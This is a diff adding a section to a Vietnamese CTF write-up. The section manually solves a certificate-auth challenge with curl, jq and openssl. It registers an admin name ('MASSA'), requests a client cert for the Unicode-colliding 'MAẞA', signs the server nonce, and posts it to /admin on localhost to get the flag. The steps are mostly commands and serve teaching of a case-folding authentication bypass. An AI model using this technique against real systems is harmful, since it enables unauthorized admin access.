@@ -75,6 +75,34 @@ Ba bước xác thực còn lại làm ngay trong **DevTools Console** — khôn
 
 -> Flag: `NNS{unic0de_subject_c0llisi0n_pwn}`
 
+### Cách khác — ký tay bằng `openssl`
+
+Nếu thích lưu cert/key ra file rồi làm bằng CLI (không dùng WebCrypto), ta ký `nonce` bằng `openssl` (cần OpenSSL 3.0+ cho `-rawin` của Ed25519):
+
+```bash!
+B=http://localhost:3002
+# 1) chiếm slot admin (MASSA)
+curl -s -X POST $B/certificates -H 'content-type: application/json' -d '{"profile":"ADMIN","name":"MASSA"}'
+# 2) lấy cert + key của CLIENT (MAẞA) ra file
+curl -s -X POST $B/certificates -H 'content-type: application/json' -d '{"profile":"CLIENT","name":"MAẞA"}' > c.json
+jq -r '.certificate' c.json > client.crt ; jq -r '.private_key' c.json > client.key
+# 3) nonce — lưu KHÔNG có ký tự xuống dòng
+curl -s $B/auth/nonce | jq -rj '.nonce' > nonce.bin
+# 4) ký Ed25519 bằng private key -> base64
+openssl pkeyutl -sign -inkey client.key -rawin -in nonce.bin -out sig.bin
+base64 -w0 sig.bin > sig.b64
+# 5) nộp /admin
+jq -n --rawfile cert client.crt --arg n "$(cat nonce.bin)" --arg s "$(cat sig.b64)" \
+   '{certificate:$cert,nonce:$n,signature:$s}' > admin.json
+curl -s -X POST $B/admin -H 'content-type: application/json' -d @admin.json
+```
+
+![image](./08-openssl-manual.png)
+
+:::warning
+Hai lỗi hay gặp khi làm tay: **nonce bị dính `\n` cuối** (Notepad tự thêm) làm chữ ký sai — phải lưu bằng `jq -rj`/`printf` không xuống dòng; và **PEM phải có xuống dòng thật** (dùng `jq -r` để đổi `\n` escape thành dòng thật, đừng dán nguyên chuỗi `\n`). Ký bằng **private key**, còn **certificate** chỉ để nộp.
+:::
+
 Full solve:
 
 ```python!
